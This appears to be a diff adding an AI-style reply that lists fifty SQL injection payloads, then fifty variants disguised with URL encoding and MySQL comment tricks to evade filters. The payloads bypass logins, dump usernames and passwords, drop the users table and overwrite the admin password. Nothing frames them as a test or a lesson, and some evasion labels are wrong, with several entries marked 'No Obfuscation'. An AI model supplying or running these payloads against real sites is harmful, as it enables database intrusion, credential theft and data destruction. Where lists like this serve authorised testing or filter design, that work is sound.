@@ -1,0 +1,107 @@
+Okay, here are the requested lists of SQL injection payloads and their obfuscated counterparts.
+
+**Original Payloads (1-50)**
+
+1.  `' OR 1=1 --`
+2.  `" OR 1=1 --`
+3.  `' OR 'a'='a`
+4.  `" OR "a"="a`
+5.  `' UNION SELECT NULL,NULL --`
+6.  `" UNION SELECT NULL,NULL --`
+7.  `' OR 1=1 LIMIT 1 --`
+8.  `" OR 1=1 LIMIT 1 --`
+9.  `'; DROP TABLE users; --`
+10. `"; DROP TABLE users; --`
+11. `' OR 'x'='x`
+12. `" OR "x"="x`
+13. `' AND 1=1 --`
+14. `" AND 1=1 --`
+15. `') OR ('a'='a`
+16. `") OR ("a"="a`
+17. `'+(SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END)+'`
+18. `"+(SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END)+"`
+19. `' OR SLEEP(5) --`
+20. `" OR SLEEP(5) --`
+21. `' || (SELECT password FROM users LIMIT 1) || '`
+22. `" || (SELECT password FROM users LIMIT 1) || "`
+23. `' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --`
+24. `" AND (SELECT * FROM (SELECT(SLEEP(5)))a) --`
+25. `' AND id IN (SELECT id FROM users) --`
+26. `" AND id IN (SELECT id FROM users) --`
+27. `' AND EXISTS (SELECT * FROM users) --`
+28. `" AND EXISTS (SELECT * FROM users) --`
+29. `'; UPDATE users SET password = 'hacked' WHERE username = 'admin'; --`
+30. `"; UPDATE users SET password = 'hacked' WHERE username = 'admin'; --`
+31. `' AND (SELECT COUNT(*) FROM users) > 0 --`
+32. `" AND (SELECT COUNT(*) FROM users) > 0 --`
+33. `' AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a' --`
+34. `" AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a' --`
+35. `' OR id LIKE '%1%' --`
+36. `" OR id LIKE '%1%' --`
+37. `' OR id REGEXP '^1' --`
+38. `" OR id REGEXP '^1' --`
+39. `' OR name LIKE '%admin%' --`
+40. `" OR name LIKE '%admin%' --`
+41. `'+(SELECT 1 FROM users WHERE username = 'admin')+'`
+42. `"+(SELECT 1 FROM users WHERE username = 'admin')+"`
+43. `' AND (SELECT 1 FROM users WHERE username = 'admin') = 1 --`
+44. `" AND (SELECT 1 FROM users WHERE username = 'admin') = 1 --`
+45. `' OR (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0 --`
+46. `" OR (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0 --`
+47. `' UNION ALL SELECT username, password FROM users --`
+48. `" UNION ALL SELECT username, password FROM users --`
+49. `' AND (SELECT GROUP_CONCAT(username) FROM users) LIKE '%admin%' --`
+50. `" AND (SELECT GROUP_CONCAT(username) FROM users) LIKE '%admin%' --`
+
+**Obfuscated Payloads (1-50)**
+
+1.  `%27%20OR%201%3D1%20--` - URL Encoding
+2.  `%22%20OR%201%3D1%20--` - URL Encoding
+3.  `' /*!OR*/ 'a'='a` - MySQL Conditional Comment
+4.  `" /*!OR*/ "a"="a` - MySQL Conditional Comment
+5.  `' %55NION %53ELECT NULL,NULL --` - URL Encoding + Case Mixing
+6.  `" %55NION %53ELECT NULL,NULL --` - URL Encoding + Case Mixing
+7.  `' OR 1=1 %4cIMIT 1 --` - URL Encoding
+8.  `" OR 1=1 %4cIMIT 1 --` - URL Encoding
+9.  `';%20DR%4F%50%20TABLE%20users;%20--` - URL Encoding + Case Mixing
+10. `";%20DR%4F%50%20TABLE%20users;%20--` - URL Encoding + Case Mixing
+11. `' /*!OR*/ 'x'='x` - MySQL Conditional Comment
+12. `" /*!OR*/ "x"="x` - MySQL Conditional Comment
+13. `' %41ND 1=1 --` - URL Encoding
+14. `"%20%41ND%201%3D1%20--` - URL Encoding
+15. `') %4fR ('a'='a` - URL Encoding
+16. `") %4fR ("a"="a` - URL Encoding
+17. `'+(SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END)+'` - No Obfuscation
+18. `"+(SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END)+"` - No Obfuscation
+19. `' /*!OR*/ SLEEP(5) --` - MySQL Conditional Comment
+20. `" /*!OR*/ SLEEP(5) --` - MySQL Conditional Comment
+21. `'||(/*!sElEcT*/ password /*!fRoM*/ users LIMIT 1) ||'` - MySQL Conditional Comment
+22. `"||(/*!sElEcT*/ password /*!fRoM*/ users LIMIT 1) ||"` - MySQL Conditional Comment
+23. `' %41ND (SELECT * FROM (SELECT(SLEEP(5)))a) --` - URL Encoding
+24. `" %41ND (SELECT * FROM (SELECT(SLEEP(5)))a) --` - URL Encoding
+25. `' %41ND id IN (SELECT id FROM users) --` - URL Encoding
+26. `" %41ND id IN (SELECT id FROM users) --` - URL Encoding
+27. `' %41ND EXISTS (SELECT * FROM users) --` - URL Encoding
+28. `" %41ND EXISTS (SELECT * FROM users) --` - URL Encoding
+29. `';%20UP%44ATE%20users%20SET%20password%20%3D%20%27hacked%27%20WHERE%20username%20%3D%20%27admin%27;%20--` - URL Encoding
+30. `";%20UP%44ATE%20users%20SET%20password%20%3D%20%27hacked%27%20WHERE%20username%20%3D%20%27admin%27;%20--` - URL Encoding
+31. `' %41ND (SELECT COUNT(*) FROM users) > 0 --` - URL Encoding
+32. `" %41ND (SELECT COUNT(*) FROM users) > 0 --` - URL Encoding
+33. `' %41ND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a' --` - URL Encoding
+34. `" %41ND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a' --` - URL Encoding
+35. `' /*!OR*/ id LIKE '%1%' --` - MySQL Conditional Comment
+36. `" /*!OR*/ id LIKE '%1%' --` - MySQL Conditional Comment
+37. `' /*!OR*/ id REGEXP '^1' --` - MySQL Conditional Comment
+38. `" /*!OR*/ id REGEXP '^1' --` - MySQL Conditional Comment
+39. `' /*!OR*/ name LIKE '%admin%' --` - MySQL Conditional Comment
+40. `" /*!OR*/ name LIKE '%admin%' --` - MySQL Conditional Comment
+41. `'+(SELECT 1 FROM users WHERE username = 'admin')+'` - No Obfuscation
+42. `"+(SELECT 1 FROM users WHERE username = 'admin')+"` - No Obfuscation
+43. `' %41ND (SELECT 1 FROM users WHERE username = 'admin') = 1 --` - URL Encoding
+44. `" %41ND (SELECT 1 FROM users WHERE username = 'admin') = 1 --` - URL Encoding
+45. `' /*!OR*/ (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0 --` - MySQL Conditional Comment
+46. `" /*!OR*/ (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0 --` - MySQL Conditional Comment
+47. `' %55NION %41LL SELECT username, password FROM users --` - URL Encoding + Case Mixing
+48. `" %55NION %41LL SELECT username, password FROM users --` - URL Encoding + Case Mixing
+49. `' %41ND (SELECT GROUP_CONCAT(username) FROM users) LIKE '%admin%' --` - URL Encoding
+50. `" %41ND (SELECT GROUP_CONCAT(username) FROM users) LIKE '%admin%' --` - URL Encoding
